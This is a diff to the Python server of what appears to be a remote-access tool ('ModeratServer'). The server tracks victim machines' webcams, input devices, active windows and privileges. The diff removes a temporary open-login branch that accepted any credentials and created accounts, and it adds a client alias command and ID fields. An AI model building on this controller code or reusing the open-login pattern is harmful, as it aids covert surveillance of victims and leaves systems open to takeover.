@@ -203,16 +203,6 @@ class ModeratServer:
                             SessionsManagment().create_session(username, session_id)
                             moderator_send(sock, 'LoginSuccess', session_id)
 
-                        # TODO: TEMP OPEN LOGIN
-                        elif True:
-                            ModeratorsManagment().create_user(username, password, 1)
-                            if ModeratorsManagment().login_user(username, password):
-                                print '[+] Login Success For Moderator (%s) Session ID (%s)' % (username, session_id)
-                                self.active_sessions.append(session_id)
-                                SessionsManagment().create_session(username, session_id)
-                                moderator_send(sock, 'LoginSuccess', session_id)
-                        # TODO: END TEMP
-
                         else:
                             print '[!] Login Failed With (%s, %s)' % (username, password)
                             moderator_send(sock, 'LoginError', session_id)
@@ -226,6 +216,8 @@ class ModeratServer:
                         if data == 'getClients':
                             username_from_sessions = SessionsManagment().get_session(session_id)
                             output = self.command_get_clients(username_from_sessions)
+                        elif data.startswith('setAlias '):
+                            output = ClientsManagment().set_alias(client_socket, data.split()[-1])
                         else:
                             output = self.command_all(data, client_socket)
                         moderator_send(sock, output, client_socket)
@@ -250,12 +242,14 @@ class ModeratServer:
                 try:
                     self.shared_socks[i] = {
                         'status': True,
+                        'id': self.socks[i]['id'],
                         'ip_address': self.socks[i]['ip_address'],
                         'socket': self.socks[i]['socket'],
                         'ostype': self.socks[i]['ostype'],
                         'protection': self.streaming_socks[i]['protection'],
                         'os': self.socks[i]['os'],
-                        'user': self.socks[i]['user'] + ' ' + self.socks[i]['id'],
+                        'user': self.socks[i]['user'] + ' (%s)' % self.socks[i]['id'],
+                        'alias': ClientsManagment().get_alias(self.socks[i]['id']),
                         'privileges': self.streaming_socks[i]['privileges'],
                         'inputdevice': self.socks[i]['inputdevice'],
                         'webcamdevice': self.socks[i]['webcamdevice'],
@@ -275,20 +269,20 @@ class ModeratServer:
             for client in offline_clients:
                 self.shared_socks['OFFLINE_'+client[1]] = {
                     'status': False,
+                    'id': client[1],
                     'ip_address': client[3],
                     'socket': 'OFFLINE',
                     'ostype': 'OFFLINE',
                     'protection': 'locked',
                     'os': 'OFFLINE',
                     'user': 'OFFLINE',
+                    'alias': client[2],
                     'privileges': 'OFFLINE',
                     'inputdevice': 'OFFLINE',
                     'webcamdevice': 'OFFLINE',
                     'activewindowtitle': 'OFFLINE',
-                    'alias': client[2],
                     'last_online': client[4],
                 }
-                print 'Checking ID ', client[1]
                 if ClientsManagment().is_online(client[1]):
                     del self.shared_socks[client[1]]
 
@@ -297,7 +291,6 @@ class ModeratServer:
     def clear_offline_clients(self, _dict):
         for i in _dict.keys():
             if type(i) == unicode:
-                print 'DELETE'
                 del _dict[i]
         return _dict
 
